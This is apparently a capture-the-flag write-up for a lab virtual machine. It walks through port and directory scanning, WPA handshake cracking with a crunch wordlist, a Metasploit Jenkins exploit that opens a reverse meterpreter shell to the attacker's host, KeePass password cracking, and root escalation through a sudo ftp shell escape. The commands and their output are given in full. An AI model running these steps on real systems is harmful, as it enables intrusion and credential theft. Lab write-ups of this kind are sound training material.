Infininty Stones

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Password Generating with Crunch
[+] WifiPcap Cracking with AirCrack-ng
[+] Exploiting Jenkins with Metasploit (admin password guessed)
[+] Finding File permissions
[+] Cracking Keepass files with john the ripper
[+] Privilege Escalation Abusing SUDO rights -  /usr/bin/ftp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nmap -f 192.168.56.106
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-25 05:18 EDT
Nmap scan report for 192.168.56.106
Host is up (0.00016s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:1D:E1:E0 (Oracle VirtualBox virtual NIC)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.106

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct 25 05:06:26 2019
URL_BASE: http://192.168.56.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.106/ ----
==> DIRECTORY: http://192.168.56.106/images/                                   
==> DIRECTORY: http://192.168.56.106/img/                                      
+ http://192.168.56.106/index.html (CODE:200|SIZE:3261)                        
+ http://192.168.56.106/server-status (CODE:403|SIZE:279)                      
==> DIRECTORY: http://192.168.56.106/wifi/                                     
                                                                               
---- Entering directory: http://192.168.56.106/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.106/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.106/wifi/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to /wifi we find a pwd.txt and a reality.cap


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.106/wifi/pwd.txt
Your Password is thanos daughter name   "gam" (note it's all lower case) plus the following
I enforced new password requirement on you ... 12 characters


One uppercase charracter
Two Numbers
Two Lowercase
The Year of first avengers came out in threatre

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Generating a password file with Crunch based on the information from pwd.txt


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# crunch 12 12 -t gam,%%@@2012 -o pass.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Cracking the password:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# aircrack-ng -a2 -w pass.txt reality.cap 
Opening reality.capease wait...
Read 4848 packets.

   #  BSSID              ESSID                     Encryption

   1  38:D5:47:42:EE:A0  Kavish_2.4Ghz             WPA (1 handshake)

Choosing first network as target.

Opening reality.capease wait...
Read 4848 packets.

1 potential targets



                              Aircrack-ng 1.5.2 

      [00:00:15] 65513/1757592 keys tested (4124.58 k/s) 

      Time left: 6 minutes, 50 seconds                           3.73%

                         KEY FOUND! [ gamA00fe2012 ]


      Master Key     : E3 8A EA 36 22 96 20 EC D4 93 06 0B 9C 5A 92 77 
                       29 C3 63 60 54 43 BB 8E 2F 18 26 69 80 4E 9C 26 

      Transient Key  : FC DD 50 29 95 31 28 9E 6D 76 D9 B5 3D 69 EF E1 
                       9E A9 6B D3 E4 C8 D0 10 0C 19 EC 62 F0 2C 64 B2 
                       9D C9 66 0D 14 B9 D1 32 53 65 EA EF B1 34 8F 99 
                       D4 5A E6 0B 0C 8A AC 62 38 87 7D 90 4A 7D 35 97 

      EAPOL HMAC     : 41 6E 3D 0F 7B 6C EB 8A B2 AA 79 73 AB FE 50 2A 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


On port 8080 there is a Jenkins installation: Credentials admin and password : avengers (guessed)

Exploiting Jenkins on Linux with Metasploit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf5 > use exploit/multi/http/jenkins_script_console

msf5 exploit(multi/http/jenkins_script_console) > set rhosts 192.168.56.106
rhosts => 192.168.56.106
msf5 exploit(multi/http/jenkins_script_console) > set target /
target => /
msf5 exploit(multi/http/jenkins_script_console) > set username admin
username => admin
msf5 exploit(multi/http/jenkins_script_console) > set password avengers
password => avengers
msf5 exploit(multi/http/jenkins_script_console) > set target 1
target => 1
msf5 exploit(multi/http/jenkins_script_console) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/http/jenkins_script_console) > set targeturi /
targeturi => /
msf5 exploit(multi/http/jenkins_script_console) > set rport 8080
rport => 8080
msf5 exploit(multi/http/jenkins_script_console) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] Checking access to the script console
[*] Logging in...
[*] Using CSRF token: '909300dc2fcc1a0052981b73c2d8ad19' (Jenkins-Crumb style)
[*] 192.168.56.106:8080 - Sending Linux stager...
[*] Sending stage (914728 bytes) to 192.168.56.106
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.106:44046) at 2019-10-25 05:28:45 -0400

meterpreter > 
[!] Deleting /tmp/1FA5Gvg payload file
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Privilege Escalation
Searcking for file permissions  : find / -perm -u=s -file f 2>/dev/null


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jenkins@ubuntu:/home$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
/opt/script
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
...snip ..

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Opening the /opt folder we found two files : 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jenkins@ubuntu:~$ cd /opt
cd /opt
jenkins@ubuntu:/opt$ ls -al
ls -al
total 24
drwxr-xr-x  2 root root 4096 Sep 15 21:35 .
drwxr-xr-x 24 root root 4096 Sep 15 09:31 ..
-rw-r--r--  1 root root 2558 Sep 15 21:32 morag.kdbx
-rwsr-xr-x  1 root root 8304 Sep 15 10:48 script

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Downloading the morag.kdbx and cracking the passwords

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
meterpreter > download /opt/morag.kdbx
[*] Downloading: /opt/morag.kdbx -> morag.kdbx
[*] Downloaded 2.50 KiB of 2.50 KiB (100.0%): /opt/morag.kdbx -> morag.kdbx
[*] download   : /opt/morag.kdbx -> morag.kdbx

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Cracking password:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# keepass2john morag.kdbx > morag.hash
root@setrus:~# john morag.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Wordlist
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8
needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
princesa         (morag)
1g 0:00:00:30 DONE 2/3 (2019-10-25 05:48) 0.03288g/s 94.24p/s 94.24c/s 94.24C/s pretty..princesa
Use the "--show" option to display all of the cracked passwords reliably
Session completed

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


username : morag
password : princesa

Launching the morag.kdbx file into Keepass and enter the password : princesa




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# echo 'bW9yYWc6eW9uZHU=' | base64 -d
morag:yondu
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Logging into the server with the credentials obtained:


Privilege escalation



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
morag@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for morag on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User morag may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/ftp
morag@ubuntu:/$ sudo /usr/bin/ftp
sudo /usr/bin/ftp
ftp> !/bin/bash
!/bin/bash
morag@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for morag on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User morag may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/ftp
morag@ubuntu:/$ sudo /usr/bin/ftp
sudo /usr/bin/ftp
ftp> !/bin/bash
!/bin/bash
morag@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for morag on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User morag may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/ftp
morag@ubuntu:/$ sudo /usr/bin/ftp
sudo /usr/bin/ftp
ftp> !/bin/bash
!/bin/bash
root@ubuntu:/# id
id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
















